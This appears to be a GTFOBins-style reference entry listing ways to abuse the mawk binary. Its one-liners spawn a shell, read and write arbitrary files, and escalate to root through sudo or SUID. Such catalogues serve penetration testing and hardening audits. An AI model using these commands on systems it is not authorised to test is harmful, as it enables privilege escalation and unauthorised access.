---
functions:
  shell:
    - code: mawk 'BEGIN {system("/bin/sh")}'
  file-write:
    - code: |
        LFILE=file_to_write
        mawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
  file-read:
    - code: |
        LFILE=file_to_read
        mawk '//' "$LFILE"
  suid:
    - code: |
        LFILE=file_to_read
        ./mawk '//' "$LFILE"
  sudo:
    - code: sudo mawk 'BEGIN {system("/bin/sh")}'
  limited-suid:
    - code: ./mawk 'BEGIN {system("/bin/sh")}'
---
